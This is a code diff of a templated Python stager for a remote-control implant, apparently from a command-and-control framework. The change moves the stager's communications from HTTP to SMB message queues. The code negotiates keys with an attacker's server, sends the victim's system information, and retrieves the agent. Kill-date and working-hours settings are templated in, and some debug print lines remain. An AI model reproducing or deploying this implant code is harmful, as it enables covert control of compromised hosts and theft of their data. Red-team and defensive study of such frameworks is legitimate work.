@@ -9,20 +9,16 @@ This file is a Jinja2 template.
         profile
 """
 
+import base64
 import random
 import string
-import urllib.request
 
 {% include 'common/rc4.py' %}
 {% include 'common/aes.py' %}
 {% include 'common/diffiehellman.py' %}
 {% include 'common/get_sysinfo.py' %}
-{% include 'common/sockschain.py' %}
-{% include 'http/comms.py' %}
+{% include 'smb/comms.py' %}
 
-def post_message(uri, data):
-    global headers
-    return (urllib.request.urlopen(urllib.request.Request(uri, data, headers))).read()
 
 # generate a randomized sessionID
 sessionID = b''.join(random.choice(string.ascii_uppercase + string.digits).encode('UTF-8') for _ in range(8))
@@ -32,6 +28,7 @@ stagingKey = b'{{ staging_key }}'
 profile = '{{ profile }}'
 WorkingHours = '{{ working_hours }}'
 KillDate = '{{ kill_date }}'
+server = ''
 
 parts = profile.split('|')
 taskURIs = parts[0].split(',')
@@ -42,10 +39,6 @@ headersRaw = parts[2:]
 #   sessionID is set by stager.py
 # headers = {'User-Agent': userAgent, "Cookie": "SESSIONID=%s" % (sessionID)}
 headers = {'User-Agent': userAgent}
-try:
-    headers['Hop-Name'] = hop
-except:
-    pass
 
 # parse the headers into the global header dictionary
 for headerRaw in headersRaw:
@@ -56,7 +49,7 @@ for headerRaw in headersRaw:
             headers['Cookie'] = "%s;%s" % (headers['Cookie'], headerValue)
         else:
             headers[headerKey] = headerValue
-    except Exception:
+    except:
         pass
 
 # stage 3 of negotiation -> client generates DH key, and POSTs HMAC(AESn(PUBc)) back to server
@@ -68,12 +61,20 @@ hmacData=aes_encrypt_then_hmac(stagingKey,public_key)
 #   meta = STAGE1 (2)
 routingPacket = build_routing_packet(stagingKey=stagingKey, sessionID=sessionID, meta=2, encData=hmacData)
 
-try:
-    postURI = server + "{{ stage_1 | default('/index.jsp', true) | ensureleadingslash }}"
-    # response = post_message(postURI, routingPacket+hmacData)
-    response = post_message(postURI, routingPacket)
-except Exception:
-    exit()
+#try:
+#postURI = server + "{{ stage_1 | default('/index.jsp', true) | ensureleadingslash }}"
+# response = post_message(postURI, routingPacket+hmacData)
+b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
+send_queue.Enqueue("2" + b64routingPacket)
+
+while receive_queue.Count == 0:
+    time.sleep(1)
+
+data = receive_queue.Peek()
+print(data)
+response = base64.b64decode(data)
+receive_queue.Dequeue()
+print(response)
 
 # decrypt the server's public key and the server nonce
 packet = aes_decrypt_and_verify(stagingKey, response)
@@ -84,8 +85,8 @@ serverPub = int(packet[16:])
 clientPub.genKey(serverPub)
 key = clientPub.key
 
+
 # step 5 -> client POSTs HMAC(AESs([nonce+1]|sysinfo)
-postURI = server + "{{ stage_2 | default('/index.php', true) | ensureleadingslash}}"
 hmacData = aes_encrypt_then_hmac(key, get_sysinfo(nonce=str(int(nonce)+1)).encode('UTF-8'))
 
 # RC4 routing packet:
@@ -95,8 +96,15 @@ hmacData = aes_encrypt_then_hmac(key, get_sysinfo(nonce=str(int(nonce)+1)).encod
 #   extra = 0
 #   length = len(length)
 routingPacket = build_routing_packet(stagingKey=stagingKey, sessionID=sessionID, meta=3, encData=hmacData)
+b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
+send_queue.Enqueue("2" + b64routingPacket)
 
-response = post_message(postURI, routingPacket)
+while receive_queue.Count == 0:
+    time.sleep(1)
+
+data = receive_queue.Peek()
+response = base64.b64decode(data)
+receive_queue.Dequeue()
 
 # step 6 -> server sends HMAC(AES)
 agent = aes_decrypt_and_verify(key, response)
